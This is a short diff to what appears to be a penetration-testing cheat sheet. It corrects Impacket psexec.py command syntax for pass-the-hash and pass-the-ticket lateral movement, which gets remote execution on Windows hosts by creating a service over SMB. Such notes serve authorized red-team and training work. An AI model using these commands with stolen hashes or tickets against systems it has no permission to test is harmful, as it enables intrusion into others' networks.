@@ -15,7 +15,7 @@ psexec.py '<domain>'/'<user>':'<password>'@<ip>
 create a new service (using \pipe\svcctl via SMB)
 
 ```
-psexec.py -hashes <nt_hash> <user>@<ip>
+psexec.py -hashes :<nt_hash> <user>@<ip>
 ```
 
 ## ptt
@@ -23,6 +23,6 @@ psexec.py -hashes <nt_hash> <user>@<ip>
 create a new service (using \pipe\svcctl via SMB)
 
 ```
-export KRB5CCNAME=<ccache>; psexec.py -dc-ip <dc_ip> -target-ip <ip> -no-pass -k <domain>/<user>@<target_name>
+export KRB5CCNAME=<ccache>; psexec.py -dc-ip <dc_ip> -target-ip <ip> -no-pass -k <target_name>
 ```
 
